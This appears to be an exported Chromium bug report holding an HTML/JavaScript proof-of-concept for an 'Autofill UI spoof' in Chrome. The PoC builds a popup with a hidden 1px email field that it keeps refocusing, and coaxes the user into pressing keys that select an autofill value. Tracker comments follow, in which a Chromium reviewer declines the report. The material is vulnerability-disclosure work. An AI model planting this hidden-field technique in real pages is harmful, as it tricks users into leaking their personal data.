+  &lt;<span class="stx-keyword">style</span>&gt;
+    body { font-family: sans-serif; padding: <span class="stx-number">20</span>px; }
+    button { font-size: <span class="stx-number">16</span>px; padding: <span class="stx-number">8</span>px <span class="stx-number">12</span>px; }
+    .note { margin-top: <span class="stx-number">12</span>px; color: #<span class="stx-number">444</span>; }
+  &lt;/<span class="stx-keyword">style</span>&gt;
+&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+  &lt;<span class="stx-keyword">h2</span>&gt;[Bypass] Autofill UI Spoof leaking emails - Chrome&lt;/<span class="stx-keyword">h2</span>&gt;
+  &lt;<span class="stx-keyword">p</span>&gt;
+    This will open a small popup window with a hidden email input.
+    Follow the steps below to reproduce the issue.
+  &lt;/<span class="stx-keyword">p</span>&gt;
+
+  &lt;<span class="stx-keyword">ol</span>&gt;
+    &lt;<span class="stx-keyword">li</span>&gt;Open this poc in Chrome - Version <span class="stx-number">140.0</span>.<span class="stx-number">7339.81</span> (Official Build) (<span class="stx-number">64</span>-bit)&lt;/<span class="stx-keyword">li</span>&gt;
+    &lt;<span class="stx-keyword">li</span>&gt;Click the button below to open the popup.&lt;/<span class="stx-keyword">li</span>&gt;
+    &lt;<span class="stx-keyword">li</span>&gt;In the popup, follow the on-screen instruction and press: &lt;<span class="stx-keyword">b</span>&gt;Up Arrow&lt;/<span class="stx-keyword">b</span>&gt; then &lt;<span class="stx-keyword">b</span>&gt;Enter&lt;/<span class="stx-keyword">b</span>&gt;.&lt;/<span class="stx-keyword">li</span>&gt;
+    &lt;<span class="stx-keyword">li</span>&gt;The PoC will show whether the hidden autofill value was selected.&lt;/<span class="stx-keyword">li</span>&gt;
+  &lt;/<span class="stx-keyword">ol</span>&gt;
+
+  &lt;<span class="stx-keyword">button</span> id=<span class="stx-string">&quot;open&quot;</span>&gt;Open popup PoC&lt;/<span class="stx-keyword">button</span>&gt;
+  &lt;<span class="stx-keyword">div</span> class=<span class="stx-string">&quot;note&quot;</span>&gt;We can see that the dropdown is off/hidden, and that pressing keys selects a hidden value.&lt;/<span class="stx-keyword">div</span>&gt;
+
+&lt;<span class="stx-keyword">script</span>&gt;
+document.getElementById(<span class="stx-string">&#39;open&#39;</span>).addEventListener(<span class="stx-string">&#39;click&#39;</span>, () =&gt; {
+  // Open a small popup
+  const w = window.open(<span class="stx-string">&#39;&#39;</span>, <span class="stx-string">&#39;&#39;</span>, <span class="stx-string">&#39;width=250,height=150,left=100,top=100&#39;</span>);
+
+  // Basic HTML for the popup. No eval, no external scripts.
+  const html = `
+    &lt;!doctype html&gt;
+    &lt;<span class="stx-keyword">html</span>&gt;
+      &lt;<span class="stx-keyword">head</span>&gt;
+        &lt;<span class="stx-keyword">meta</span> charset=<span class="stx-string">&quot;utf-8&quot;</span>&gt;
+        &lt;<span class="stx-keyword">title</span>&gt;Popup&lt;/<span class="stx-keyword">title</span>&gt;
+        &lt;<span class="stx-keyword">style</span>&gt;
+          body { font-family: sans-serif; margin: <span class="stx-number">8</span>px; }
+          p { margin: <span class="stx-number">6</span>px <span class="stx-number">0</span>; }
+          .hint { font-weight: bold; color: #b<span class="stx-number">00</span>; }
+        &lt;/<span class="stx-keyword">style</span>&gt;
+      &lt;/<span class="stx-keyword">head</span>&gt;
+      &lt;<span class="stx-keyword">body</span>&gt;
+        &lt;<span class="stx-keyword">p</span> class=<span class="stx-string">&quot;hint&quot;</span>&gt;Please press &lt;<span class="stx-keyword">kbd</span>&gt;↑&lt;/<span class="stx-keyword">kbd</span>&gt; then &lt;<span class="stx-keyword">kbd</span>&gt;Enter&lt;/<span class="stx-keyword">kbd</span>&gt; now.&lt;/<span class="stx-keyword">p</span>&gt;
+        &lt;<span class="stx-keyword">p</span> style=<span class="stx-string">&quot;font-size:12px;color:#666&quot;</span>&gt;If the Autofill UI is clipped/hidden by the browser chrome, this demonstrates the issue.&lt;/<span class="stx-keyword">p</span>&gt;
+      &lt;/<span class="stx-keyword">body</span>&gt;
+    &lt;/<span class="stx-keyword">html</span>&gt;
+  `;
+
+  // write controlled content into the popup
+  w.document.open();
+  w.document.write(html);
+  w.document.close();
+
+  // Create the hidden input and the logging area through DOM API which avoid CSP/trusted types issues
+  // Delay a little so popup document is ready
+  setTimeout(() =&gt; {
+    try {
+      const doc = w.document;
+
+      // Create a visible area for proof (so you can see the captured value)
+      const log = doc.createElement(<span class="stx-string">&#39;div&#39;</span>);
+      log.id = <span class="stx-string">&#39;log&#39;</span>;
+      doc.body.appendChild(log);
+
+      // The hidden input that will receive autofill
+      const input = doc.createElement(<span class="stx-string">&#39;input&#39;</span>);
+      input.type = <span class="stx-string">&#39;email&#39;</span>;
+      input.autocomplete = <span class="stx-string">&#39;email&#39;</span>;
+      input.name = <span class="stx-string">&#39;email&#39;</span>;
+      input.setAttribute(<span class="stx-string">&#39;id&#39;</span>, <span class="stx-string">&#39;hiddenEmail&#39;</span>);
+
+      // Make invisible but focusable
+      input.style.opacity = <span class="stx-string">&#39;0&#39;</span>;
+      input.style.position = <span class="stx-string">&#39;absolute&#39;</span>;
+      input.style.left = <span class="stx-string">&#39;10px&#39;</span>;
+      input.style.top = <span class="stx-string">&#39;60px&#39;</span>;
+      input.style.width = <span class="stx-string">&#39;1px&#39;</span>;
+      input.style.height = <span class="stx-string">&#39;1px&#39;</span>;
+      input.style.border = <span class="stx-string">&#39;0&#39;</span>;
+      input.tabIndex = <span class="stx-number">0</span>;
+
+      // Prevent mouse from interfering
+      doc.addEventListener(<span class="stx-string">&#39;mousedown&#39;</span>, (e) =&gt; { e.preventDefault(); }, true);
+
+      // When autofill completes, onchange fires. Show result for proof.
+      input.addEventListener(<span class="stx-string">&#39;change&#39;</span>, (ev) =&gt; {
+        const val = ev.target.value;
+        // show in popup (so screen-recording proof)
+        const p = doc.createElement(<span class="stx-string">&#39;p&#39;</span>);
+        p.style.color = <span class="stx-string">&#39;green&#39;</span>;
+        p.textContent = <span class="stx-string">&#39;Hidden input value selected: &#39;</span> + val;
+        log.appendChild(p);
+        // Also send to opener window console for quick debugging.
+        try { window.console.log(<span class="stx-string">&#39;POC selected value:&#39;</span>, val); } catch(e){}
+      });
+
+      doc.body.appendChild(input);
+
+      // Repeatedly focus input to encourage autofill display
+      // interval kept moderate to avoid spamming browser
+      const focuser = w.setInterval(() =&gt; {
+        try {
+          input.focus({preventScroll: true});
+        } catch (e) {
+          // ignore focus errors
+        }
+      }, <span class="stx-number">700</span>);
+
+      // Add a small close button so experimenter can close popup
+      const closeBtn = doc.createElement(<span class="stx-string">&#39;button&#39;</span>);
+      closeBtn.textContent = <span class="stx-string">&#39;Close popup&#39;</span>;
+      closeBtn.style.display = <span class="stx-string">&#39;block&#39;</span>;
+      closeBtn.style.marginTop = <span class="stx-string">&#39;8px&#39;</span>;
+      closeBtn.addEventListener(<span class="stx-string">&#39;click&#39;</span>, () =&gt; {
+        w.clearInterval(focuser);
+        try { w.close(); } catch(e){}
+      });
+      log.appendChild(closeBtn);
+
+      // Focus once immediately
+      setTimeout(() =&gt; {
+        try { input.focus({preventScroll:true}); } catch(e){}
+      }, <span class="stx-number">150</span>);
+
+      // End setup
+    } catch (err) {
+      alert(<span class="stx-string">&#39;Popup setup failed: &#39;</span> + err);
+    }
+  }, <span class="stx-number">150</span>);
+});
+&lt;/<span class="stx-keyword">script</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+
+Author: pa...@gmail.com
+TkRReU9UVXlNamN5TFRZNU1UTXpNemt4TFMwNE1qZzNNalU0TnpVPQ==
+
+Author: pa...@gmail.com
+TVRaa1pHRTRZak14Tm1RNU5qQTROamhoTmpsa1pXWm1aRFUwTWpFd05UUT0=
+
+Author: th...@chromium.org
+I have taken a look at the video you uploaded. That has the same issue where the autofill dropdown options are visible. If you can reproduce a version where the autofill dropdown options are not visible, please file a new bug. I will not review this one after this comment.
+
+Author: th...@chromium.org
+TkRReU9UVXlNamN5TFRZNU1UUTRORE0xTFRFME56a3pOalU1TUE9PQ==
+
+Author: pe...@google.com
+<p>The NextAction date has arrived: 2025-09-09
+To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the &quot;Chromium Labels&quot; custom field.</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
